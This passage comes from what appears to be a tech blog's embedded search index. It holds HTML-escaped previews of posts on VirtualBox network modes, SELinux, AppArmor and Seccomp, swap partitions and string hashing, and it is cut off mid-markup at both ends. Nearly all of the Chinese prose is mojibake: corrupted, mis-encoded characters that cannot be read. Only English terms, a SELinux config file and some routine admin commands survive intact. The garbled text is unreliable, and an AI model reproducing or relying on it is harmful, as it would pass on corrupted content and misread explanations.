&lt;p&gt;&lt;strong&gt;ç‰¹ç‚¹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœä¸»æœºå¯ä»¥ä¸Šç½‘ï¼Œè™šæ‹Ÿæœºå¯ä»¥ä¸Šç½‘&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥pingé€š&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºå¯ä»¥pingé€šä¸»æœº&lt;/li&gt;
&lt;li&gt;ä¸»æœºå¯ä»¥pingé€šè™šæ‹Ÿæœº&lt;/li&gt;
&lt;li&gt;å¦‚æœä¸»æœºä¸å¯ä»¥ä¸Šç½‘ï¼Œæ‰€æœ‰1-4ç‰¹ç‚¹å‡æ— &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½¿ç”¨åœºæ™¯ï¼šè™šæ‹Ÿæœºè¦æ±‚å¯ä»¥ä¸Šç½‘ï¼Œä¸”è™šæ‹Ÿæœºå®Œå…¨æ¨¡æ‹Ÿä¸€å°å®ä½“æœºã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NAT(ç½‘ç»œåœ°å€è½¬æ¢æ¨¡å¼)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨NATæ¨¡å¼ç½‘ç»œè¿æ¥æ—¶ï¼ŒVMwareä¼šåœ¨ä¸»æœºä¸Šå»ºç«‹å•ç‹¬çš„ä¸“ç”¨ç½‘ç»œï¼Œç”¨ä»¥åœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´ç›¸äº’é€šä¿¡ã€‚è™šæ‹Ÿæœºå‘å¤–éƒ¨ç½‘ç»œå‘é€çš„è¯·æ±‚æ•°æ®â€åŒ…è£¹â€ï¼Œéƒ½ä¼šäº¤ç”±NATç½‘ç»œé€‚é…å™¨åŠ ä¸Šâ€ç‰¹æ®Šæ ‡è®°â€å¹¶ä»¥ä¸»æœºçš„åä¹‰è½¬å‘å‡ºå»ï¼Œå¤–éƒ¨ç½‘ç»œè¿”å›çš„å“åº”æ•°æ®â€åŒ…è£¹â€ï¼Œä¹Ÿæ˜¯å…ˆç”±ä¸»æœºæ¥æ”¶ï¼Œç„¶åäº¤ç”±NATç½‘ç»œé€‚é…å™¨æ ¹æ®â€ç‰¹æ®Šæ ‡è®°â€è¿›è¡Œè¯†åˆ«å¹¶è½¬å‘ç»™å¯¹åº”çš„è™šæ‹Ÿæœºï¼Œå› æ­¤ï¼Œè™šæ‹Ÿæœºåœ¨å¤–éƒ¨ç½‘ç»œä¸­ä¸å¿…å…·æœ‰è‡ªå·±çš„IPåœ°å€ã€‚ä»å¤–éƒ¨ç½‘ç»œæ¥çœ‹ï¼Œè™šæ‹Ÿæœºå’Œä¸»æœºåœ¨å…±äº«ä¸€ä¸ªIPåœ°å€ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¤–éƒ¨ç½‘ç»œç»ˆç«¯ä¹Ÿæ— æ³•è®¿é—®åˆ°è™šæ‹Ÿæœºã€‚æ­¤å¤–ï¼Œåœ¨ä¸€å°ä¸»æœºä¸Šåªå…è®¸æœ‰ä¸€ä¸ªNATæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œã€‚å› æ­¤ï¼ŒåŒä¸€å°ä¸»æœºä¸Šçš„å¤šä¸ªé‡‡ç”¨NATæ¨¡å¼ç½‘ç»œè¿æ¥çš„è™šæ‹Ÿæœºä¹Ÿæ˜¯å¯ä»¥ç›¸äº’è®¿é—®çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç‰¹ç‚¹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœä¸»æœºå¯ä»¥ä¸Šç½‘ï¼Œè™šæ‹Ÿæœºå¯ä»¥ä¸Šç½‘&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¹‹é—´ä¸èƒ½pingé€š&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºå¯ä»¥pingé€šä¸»æœºï¼ˆæ­¤æ—¶pingè™šæ‹Ÿæœºçš„ç½‘å…³ï¼Œå³æ˜¯pingä¸»æœºï¼‰&lt;/li&gt;
&lt;li&gt;ä¸»æœºä¸èƒ½pingé€šè™šæ‹Ÿæœº&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä½¿ç”¨åœºæ™¯ï¼šè™šæ‹Ÿæœºåªè¦æ±‚å¯ä»¥ä¸Šç½‘ï¼Œæ— å…¶å®ƒç‰¹æ®Šè¦æ±‚ï¼Œæ»¡è¶³æœ€ä¸€èˆ¬éœ€æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host-Only(ä»…ä¸»æœºæ¨¡å¼)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»…ä¸»æœºæ¨¡å¼ï¼Œæ˜¯ä¸€ç§æ¯”NATæ¨¡å¼æ›´åŠ å°é—­çš„çš„ç½‘ç»œè¿æ¥æ¨¡å¼ï¼Œå®ƒå°†åˆ›å»ºå®Œå…¨åŒ…å«åœ¨ä¸»æœºä¸­çš„ä¸“ç”¨ç½‘ç»œã€‚ä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä»…å¯¹ä¸»æœºå¯è§ï¼Œå¹¶åœ¨è™šæ‹Ÿæœºå’Œä¸»æœºç³»ç»Ÿä¹‹é—´æä¾›ç½‘ç»œè¿æ¥ã€‚ç›¸å¯¹äºNATæ¨¡å¼è€Œè¨€ï¼Œä»…ä¸»æœºæ¨¡å¼ä¸å…·å¤‡NATåŠŸèƒ½ï¼Œå› æ­¤åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ä»…ä¸»æœºæ¨¡å¼ç½‘ç»œè¿æ¥çš„è™šæ‹Ÿæœºæ— æ³•è¿æ¥åˆ°Internet(åœ¨ä¸»æœºä¸Šå®‰è£…åˆé€‚çš„è·¯ç”±æˆ–ä»£ç†è½¯ä»¶ï¼Œæˆ–è€…åœ¨Windowsç³»ç»Ÿçš„ä¸»æœºä¸Šä½¿ç”¨Internetè¿æ¥å…±äº«åŠŸèƒ½ï¼Œä»ç„¶å¯ä»¥è®©è™šæ‹Ÿæœºè¿æ¥åˆ°Internetæˆ–å…¶ä»–ç½‘ç»œ)ã€‚åœ¨åŒä¸€å°ä¸»æœºä¸Šå¯ä»¥åˆ›å»ºå¤šä¸ªä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œï¼Œå¦‚æœå¤šä¸ªè™šæ‹Ÿæœºå¤„äºåŒä¸€ä¸ªä»…ä¸»æœºæ¨¡å¼ç½‘ç»œä¸­ï¼Œé‚£ä¹ˆå®ƒä»¬ä¹‹é—´æ˜¯å¯ä»¥ç›¸äº’é€šä¿¡çš„ï¼›å¦‚æœå®ƒä»¬å¤„äºä¸åŒçš„ä»…ä¸»æœºæ¨¡å¼ç½‘ç»œï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹æ— æ³•è¿›è¡Œç›¸äº’é€šä¿¡(å¯é€šè¿‡åœ¨å®ƒä»¬ä¹‹é—´è®¾ç½®è·¯ç”±å™¨æ¥å®ç°ç›¸äº’é€šä¿¡)ã€‚&lt;/p&gt;
&lt;p&gt;ç‰¹ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¸å¯ä»¥ä¸Šç½‘&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥pingé€š&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºå¯ä»¥pingé€šä¸»æœºï¼ˆæ³¨æ„è™šæ‹Ÿæœºä¸ä¸»æœºé€šä¿¡æ˜¯é€šè¿‡ä¸»æœºçš„åä¸ºVirtualBox Host-Only Networkçš„ç½‘å¡ï¼Œå› æ­¤ipæ˜¯è¯¥ç½‘å¡ip 192.168.56.1ï¼Œè€Œä¸æ˜¯ä½ ç°åœ¨æ­£åœ¨ä¸Šç½‘æ‰€ç”¨çš„ipï¼‰&lt;/li&gt;
&lt;li&gt;ä¸»æœºå¯ä»¥pingé€šè™šæ‹Ÿæœº&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½¿ç”¨åœºæ™¯ï¼šåœ¨ä¸»æœºæ— æ³•ä¸Šç½‘çš„æƒ…å†µä¸‹ï¼ˆä¸»æœºå¯ä»¥ä¸Šç½‘çš„æƒ…å†µä¸‹å¯ä»¥ç”¨host-onlyï¼Œä¹Ÿå¯ä»¥ç”¨æ¡¥æ¥ï¼‰ï¼Œéœ€è¦æ­å»ºä¸€ä¸ªæ¨¡æ‹Ÿå±€åŸŸç½‘ï¼Œæ‰€æœ‰æœºå™¨å¯ä»¥äº’è®¿&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å†…éƒ¨ç½‘ç»œ&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¸å¯ä»¥ä¸Šç½‘&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥pingé€š&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿæœºä¸èƒ½pingé€šä¸»æœº&lt;/li&gt;
&lt;li&gt;ä¸»æœºä¸èƒ½pingé€šè™šæ‹Ÿæœº&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½¿ç”¨åœºåˆï¼šè®©å„å°è™šæ‹Ÿæœºå¤„äºéš”ç¦»çš„å±€åŸŸç½‘å†…ï¼Œåªè®©å®ƒä»¬ç›¸äº’é€šä¿¡ï¼Œä¸å¤–ç•Œï¼ˆåŒ…æ‹¬ä¸»æœºï¼‰éš”ç»&lt;/p&gt;
">ã€è™šæ‹ŸåŒ–ã€‘Virtual Boxä¸Šå››ç§ä¸åŒçš„ç½‘ç»œè¿æ¥æ¨¡å¼</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-selinux-he-apparmor/"" data-c="
          &lt;h2 id=&#34;selinux&#34;&gt;SELinux&lt;/h2&gt;
&lt;p&gt;Kernel2.6ä¹‹åå¼•å…¥ï¼Œç”±ç¾å›½å›½å®¶å®‰å…¨å±€å¼€å‘ï¼Œä½œä¸ºä¸€ä¸ªå¼ºåˆ¶è®¿é—®æ§åˆ¶æ¶æ„ã€‚&lt;/p&gt;
&lt;p&gt;SELinuxä¸»è¦æ˜¯çº¢å¸½ä»¥åŠå®ƒçš„è¡ç”Ÿå‘è¡Œç‰ˆlinux çš„ä¸€ä¸ªå·¥å…·ï¼›Ubuntu/SUSEä»¥åŠå®ƒçš„è¡ç”Ÿå‘è¡Œç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯AppArmorã€‚ä½†ä¹Ÿå¯ä»¥åœ¨ubuntuä¸Šå®‰è£…SELinuxã€‚&lt;/p&gt;
&lt;p&gt;Linuxä¸Šä¼ ç»Ÿçš„è®¿é—®æ§åˆ¶æ ‡å‡†æ˜¯è‡ªä¸»è®¿é—®æ§åˆ¶Discretionary Access Controlï¼ˆDACï¼‰ã€‚åœ¨è¿™ç§å½¢å¼ä¸‹ï¼Œä¸€ä¸ªè½¯ä»¶æˆ–å®ˆæŠ¤è¿›ç¨‹ä»¥User IDï¼ˆUIDï¼‰æˆ–Set owner User IDï¼ˆSUIDï¼‰çš„èº«ä»½è¿è¡Œï¼Œå¹¶ä¸”æ‹¥æœ‰è¯¥ç”¨æˆ·çš„ç›®æ ‡ï¼ˆæ–‡ä»¶ã€å¥—æ¥å­—ã€ä»¥åŠå…¶å®ƒè¿›ç¨‹ï¼‰æƒé™ã€‚è¿™ä½¿å¾—æ¶æ„ä»£ç å¾ˆå®¹æ˜“è¿è¡Œåœ¨ç‰¹å®šæƒé™ä¹‹ä¸‹ï¼Œä»è€Œå–å¾—è®¿é—®å…³é”®çš„å­ç³»ç»Ÿçš„æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;å¦ä¸€æ–¹é¢ï¼Œå¼ºåˆ¶è®¿é—®æ§åˆ¶Mandatory Access Controlï¼ˆMACï¼‰åŸºäºä¿å¯†æ€§å’Œå®Œæ•´æ€§å¼ºåˆ¶ä¿¡æ¯çš„éš”ç¦»ä»¥é™åˆ¶ç ´åã€‚è¯¥é™åˆ¶å•å…ƒç‹¬ç«‹äºä¼ ç»Ÿçš„Linuxå®‰å…¨æœºåˆ¶è¿ä½œï¼Œå¹¶ä¸”æ²¡æœ‰è¶…çº§ç”¨æˆ·çš„æ¦‚å¿µã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¦‚ä½•å·¥ä½œ&#34;&gt;å¦‚ä½•å·¥ä½œ&lt;/h3&gt;
&lt;p&gt;ç›¸å…³æ¦‚å¿µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸»ä½“Subjects&lt;/li&gt;
&lt;li&gt;å®¢ä½“Objects&lt;/li&gt;
&lt;li&gt;ç­–ç•¥Policy&lt;/li&gt;
&lt;li&gt;æ¨¡å¼Mode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å½“ä¸€ä¸ªä¸»ä½“Subject(å¦‚ä¸€ä¸ªç¨‹åº)å°è¯•è®¿é—®ä¸€ä¸ªç›®æ ‡Object(å¦‚ä¸€ä¸ªæ–‡ä»¶)ï¼ŒSELinuxå®‰å…¨æœåŠ¡å™¨ä»ç­–ç•¥æ•°æ®åº“Policy DBä¸­è¿è¡Œä¸€ä¸ªæ£€æŸ¥ã€‚åŸºäºå½“å‰çš„æ¨¡å¼modeï¼Œå¦‚æœSELinuxå®‰å…¨æœåŠ¡å™¨æˆäºˆæƒé™ï¼Œè¯¥ä¸»ä½“å°±èƒ½å¤Ÿè®¿é—®è¯¥ç›®æ ‡ã€‚å¦‚æœSELinuxå®‰å…¨æœåŠ¡å™¨æ‹’ç»äº†æƒé™ï¼Œå°±ä¼šåœ¨/var/log/messagesä¸­è®°å½•ä¸€æ¡æ‹’ç»ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ¨¡å¼&#34;&gt;æ¨¡å¼&lt;/h3&gt;
&lt;p&gt;SELinuxæœ‰ä¸‰ä¸ªæ¨¡å¼ã€‚è¿™äº›æ¨¡å¼å°†è§„å®šSELinuxåœ¨ä¸»ä½“è¯·æ±‚æ—¶å¦‚ä½•åº”å¯¹ã€‚è¿™äº›æ¨¡å¼æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;enforcing ç­–ç•¥å¼ºåˆ¶æ‰§è¡Œï¼ŒåŸºäºSELinuxç­–ç•¥è§„åˆ™æˆäºˆæˆ–æ‹’ç»ä¸»ä½“å¯¹ç›®æ ‡çš„è®¿é—®ï¼›&lt;/li&gt;
&lt;li&gt;permissive ä¸å¼ºåˆ¶æ‰§è¡Œï¼Œä¸å®é™…æ‹’ç»è®¿é—®ï¼Œä½†ä¼šæœ‰æ‹’ç»ä¿¡æ¯å†™å…¥æ—¥å¿—&lt;/li&gt;
&lt;li&gt;disabled ç¦ç”¨SELinux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯ä»¥é€šè¿‡å‘½ä»¤&lt;code&gt;getenforce&lt;/code&gt;æŸ¥çœ‹SELinuxè®¾ç½®çš„æ¨¡å¼ï¼Œé»˜è®¤ä¸ºEnforcingã€‚&lt;br&gt;
å¯ä»¥é€šè¿‡å‘½ä»¤&lt;code&gt;setenforce&lt;/code&gt;ä¸´æ—¶ä¿®æ”¹æ¨¡å¼ï¼Œ&lt;code&gt;setenforce 1 =&amp;gt; enforcing&lt;/code&gt;ï¼Œ&lt;code&gt;setenforce 0 =&amp;gt; permissive&lt;/code&gt;ã€‚è¿˜å¯ä»¥ä¿®æ”¹&lt;code&gt;/etc/selinux/config&lt;/code&gt;æ–‡ä»¶çš„&lt;code&gt;SELINUX=&lt;/code&gt;ã€‚&lt;br&gt;
é‡å¯æ“ä½œç³»ç»Ÿæ‰èƒ½ç”Ÿæ•ˆ&lt;/p&gt;
&lt;h3 id=&#34;ç­–ç•¥&#34;&gt;ç­–ç•¥&lt;/h3&gt;
&lt;p&gt;SELinuxçš„ç­–ç•¥æœ‰ä¸¤ç§ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;targetedï¼Œåªæœ‰ç›®æ ‡ç½‘ç»œè¿›ç¨‹å—ä¿æŠ¤(dhcpd httpd named ntpd portmap snmpd squid syslogd)&lt;/li&gt;
&lt;li&gt;strictï¼Œå¯¹æ‰€æœ‰è¿›ç¨‹å®Œå…¨çš„SELinuxä¿æŠ¤&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åŒæ ·åœ¨&lt;code&gt;etc/selinux/config&lt;/code&gt;ä¸­ä¿®æ”¹&lt;code&gt;SELINUXTYPE=&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /etc/selinux/config 

# This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
#     enforcing - SELinux security policy is enforced.
#     permissive - SELinux prints warnings instead of enforcing.
#     disabled - No SELinux policy is loaded.
SELINUX=enforcing
# SELINUXTYPE= can take one of three values:
#     targeted - Targeted processes are protected,
#     minimum - Modification of targeted policy. Only selected processes are protected. 
#     mls - Multi Level Security protection.
SELINUXTYPE=targeted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;SELinuxéœ€è¦ä¸€ä¸ªå¥½çš„ç­–ç•¥æ‰èƒ½å‘æŒ¥æœ€å¥½çš„æ•ˆæœï¼Œå¦‚æœç­–ç•¥å†™çš„å¤ªå®½æ¾ä¼šå‘æŒ¥ä¸äº†ä½œç”¨ï¼Œå¤ªä¸¥æ ¼åˆä¼šå¼•æ¥å¾ˆå¤šéº»çƒ¦ã€‚ç¾å›½å›½å®¶å®‰å…¨å±€å°†ç­–ç•¥çš„æŒ‡å®šäº¤ç”±Linuxçš„å‘è¡Œå•†æ¥åšï¼Œçº¢å¸½è‡ªå·±æŒ‡å®šçš„ä¸€ä¸ªåŸºæœ¬çš„ç­–ç•¥ï¼Œä¸€å…±åŒ…æ‹¬25ä¸ªç³»ç»ŸæœåŠ¡ï¼šypbind,dhcpd,httpd,mysqld,named,nscd,ntpd,pegasus,portmap,postgresql,snmpd,squid,syslogd,winbind,use_nfs_home_dirsã€‚&lt;/p&gt;
&lt;p&gt;ç­–ç•¥çš„å†…å®¹åœ¨&lt;code&gt;/etc/selinux/targeted&lt;/code&gt;ç›®å½•ä¸‹ï¼ŒåŒ…æ‹¬ä¸‰ä¸ªä¸»è¦æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;booleansï¼šå­˜æ”¾targeted policyä¸­æ¯ä¸ªé™åˆ¶çš„å¸ƒå°”å€¼ï¼›&lt;/li&gt;
&lt;li&gt;contexts/ï¼šå­˜å‚¨targeted policyä¸­çš„security contextsï¼›&lt;/li&gt;
&lt;li&gt;policy/ï¼šå­˜æ”¾äºŒè¿›åˆ¶policyæ–‡ä»¶policy.31ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ£€æŸ¥selinuxçŠ¶æ€&#34;&gt;æ£€æŸ¥SELinuxçŠ¶æ€&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sestatus -v
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             targeted
Current mode:                   enforcing
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Max kernel policy version:      31

Process contexts:
Current context:                unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Init context:                   system_u:system_r:init_t:s0
/usr/sbin/sshd                  system_u:system_r:sshd_t:s0-s0:c0.c1023

File contexts:
Controlling terminal:           unconfined_u:object_r:user_devpts_t:s0
/etc/passwd                     system_u:object_r:passwd_file_t:s0
/etc/shadow                     system_u:object_r:shadow_t:s0
/bin/bash                       system_u:object_r:shell_exec_t:s0
/bin/login                      system_u:object_r:login_exec_t:s0
/bin/sh                         system_u:object_r:bin_t:s0 -&amp;gt; system_u:object_r:shell_exec_t:s0
/sbin/agetty                    system_u:object_r:getty_exec_t:s0
/sbin/init                      system_u:object_r:bin_t:s0 -&amp;gt; system_u:object_r:init_exec_t:s0
/usr/sbin/sshd                  system_u:object_r:sshd_exec_t:s0

ls -Z # æŸ¥çœ‹æ–‡ä»¶çš„selinuxä¸Šä¸‹æ–‡ä¿¡æ¯
ps- Z # è¿›ç¨‹çš„selinuxåŸŸä¿¡æ¯
restorecon -R /var/www # æ¢å¤ä¸€ä¸ªæ–‡ä»¶çš„æ¨¡å¼selinuxä¸Šä¸‹æ–‡
chcon --reference=/etc/named.conf.org /etc/named.fon # ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶çš„selinuxä¸Šä¸‹æ–‡
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ€»çš„æ¥è¯´ï¼ŒSELinuxç­–ç•¥æ¯”è¾ƒå¤æ‚ï¼Œä½†æ˜¯å¯¹äºdockerååˆ†å‹å–„ï¼Œå› ä¸ºDocker SELinuxæ¨¡å—å·²ç»å¸®æˆ‘ä»¬åšäº†å“ªäº›å¤æ‚çš„SELinuxç­–ç•¥ï¼Œç”¨æˆ·åªéœ€è¦åœ¨Docker daemonå¯åŠ¨çš„æ—¶å€™åŠ ä¸Š--selinux-enabled=trueé€‰é¡¹å°±å¯ä»¥äº†ã€‚å¯ä»¥ä½¿ç”¨-security-opté€‰é¡¹æ¥å¯¹æŒ‡å®šçš„æ–‡ä»¶åšé™åˆ¶ã€‚&lt;em&gt;ä½¿ç”¨æ–¹æ³•å¾…è¡¥å……&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;apparmor&#34;&gt;AppArmor&lt;/h2&gt;
&lt;p&gt;AppAromorçš„ä¸»è¦ä½œç”¨æ˜¯è®¾ç½®æŸä¸ªå¯æ‰§è¡Œç¨‹åºçš„è®¿é—®æ§åˆ¶æƒé™ï¼Œå¯ä»¥é™åˆ¶ç¨‹åºè¯»å†™æŸä¸ªæ–‡ä»¶ã€ç›®å½•ï¼Œæ‰“å¼€è¯»å†™ç½‘ç»œç«¯å£ç­‰ã€‚AppArmorå®‰å…¨ç­–ç•¥å¯ä»¥å®Œå…¨å®šä¹‰ä¸ªåˆ«åº”ç”¨ç¨‹åºæ‰€èƒ½è®¿é—®çš„ç³»ç»Ÿèµ„æºä¸å„è‡ªçš„ç‰¹æƒã€‚&lt;/p&gt;
&lt;p&gt;Docker daemonåœ¨å¯åŠ¨çš„è¿‡ç¨‹ä¸­ä¼šå»åˆ¤æ–­å½“å‰å†…æ ¸æ˜¯å¦æ”¯æŒAppArmorï¼Œè‹¥æ”¯æŒï¼Œå°±åˆ›å»ºé»˜è®¤çš„Apparmoré…ç½®æ–‡ä»¶/etc/apparmor.d/dockerï¼Œå¹¶åº”ç”¨è¿™ä¸ªé…ç½®æ–‡ä»¶ã€‚å¯åŠ¨å®¹å™¨æ—¶ï¼Œåœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­Dockerä¼šä½¿ç”¨ç›¸åº”çš„AppArmoré…ç½®ä½œç”¨äºå®¹å™¨ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨--security-opté€‰é¡¹æ¥æŒ‡å®šä½œç”¨äºå®¹å™¨çš„AppArmoré…ç½®æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;ç›®å‰åœ¨æ”¯æŒSELinuxçš„ç³»ç»Ÿä¸Šï¼ŒDockerçš„SELinuxä¸æ˜¯é»˜è®¤æ‰“å¼€çš„ï¼Œéœ€è¦æ‰‹åŠ¨åŠ ä¸Š--selinux-enabled=trueï¼Œè€Œæ”¯æŒAppAromorçš„ç³»ç»Ÿä¸Šï¼Œé»˜è®¤æ—¶æ‰“å¼€çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;seccomp&#34;&gt;Seccomp&lt;/h2&gt;
&lt;p&gt;Seccompæ—¶linuxå†…æ ¸æä¾›çš„å®‰å…¨ç‰¹æ€§ï¼Œä»¥ç™½åå•æˆ–é»‘åå•çš„æ–¹å¼é™åˆ¶è¿›ç¨‹è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚Seccomp&lt;/p&gt;
">ã€linuxã€‘SELinux | AppArmor | Seccomp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-swap-jiao-huan-fen-qu/"" data-c="
          &lt;p&gt;swapåˆ†åŒºé€šå¸¸è¢«ç§°ä¸ºäº¤æ¢åˆ†åŒºï¼Œè¿™æ˜¯ä¸€å—ç‰¹æ®Šçš„ç¡¬ç›˜ä¸Šçš„ç©ºé—´ï¼Œå³å½“å®é™…å†…å­˜ä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šä»å†…å­˜ä¸­å–å‡ºä¸€éƒ¨åˆ†æš‚æ—¶ä¸ç”¨çš„æ•°æ®æ”¾åœ¨äº¤æ¢åˆ†åŒºä¸­ï¼Œä»è€Œè…¾å‡ºä¸€äº›å†…å­˜ç©ºé—´ï¼Œç­‰åˆ°é‚£äº›åº”ç”¨ç¨‹åºä½¿ç”¨è¿™äº›æ•°æ®æ—¶ï¼Œå†ä»äº¤æ¢åˆ†åŒºä¸­æ¢å¤åˆ°å†…å­˜ç©ºé—´ã€‚ä¸åº”è¯¥æŠŠå®ƒå½“ä½œç‰©ç†å†…å­˜çš„æ‰©å±•ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨äº¤æ¢åˆ†åŒºçš„ä¼˜ç‚¹æ˜¯åº”ç”¨ç¨‹åºå®é™…å¯ä»¥ä½¿ç”¨çš„å†…å­˜ç©ºé—´è¿œè¿œè¶…è¿‡ç³»ç»Ÿçš„ç‰©ç†å†…å­˜ï¼Œç¼ºç‚¹æ˜¯å¦‚æœé¢‘ç¹åœ°è¯»å†™ç¡¬ç›˜ï¼Œä¼šæ˜¾è‘—é™ä½æ“ä½œç³»ç»Ÿçš„è¿è¡Œæ•ˆç‡ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬äº¤æ¢åˆ†åŒºçš„å®¹é‡åº”è¯¥å¤§äºç‰©ç†å†…å­˜å¤§å°ï¼Œå»ºè®®æ˜¯å†…å­˜çš„ä¸¤å€ï¼Œä½†ä¸è¶…è¿‡2Gã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥è¯´å¦‚æœç‰©ç†å†…å­˜è¶³å¤Ÿçš„è¯ï¼Œå®Œå…¨ä¸éœ€è¦äº¤æ¢åˆ†åŒºã€‚&lt;/p&gt;
">ã€linuxã€‘swapäº¤æ¢åˆ†åŒº</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-zi-fu-chuan-ha-xi/"" data-c="
          &lt;p&gt;å…ˆçœ‹ä¸€ä¸‹è¿™é“é¢˜ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627106992146.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç”¨substrè‚¯å®šè¶…æ—¶ï¼Œè¿™é“é¢˜å¯ä»¥ç”¨å­—ç¬¦ä¸²å“ˆå¸Œã€‚&lt;/p&gt;
&lt;p&gt;å¤§è‡´æ€è·¯æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;æŠŠå­—ç¬¦ä¸²æ˜ å°„æˆä¸€ä¸ªPè¿›åˆ¶çš„æ•°æ¥è¡¨ç¤ºï¼Œä¾‹å¦‚å­—ç¬¦ä¸²&lt;code&gt;ABCD&lt;/code&gt;ï¼Œé‚£ä¹ˆå¯ä»¥ä»¤A=1ï¼ŒB=2ï¼ŒC=3ï¼ŒD=4ï¼Œ...ï¼Œé‚£ä¹ˆ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msup&gt;&lt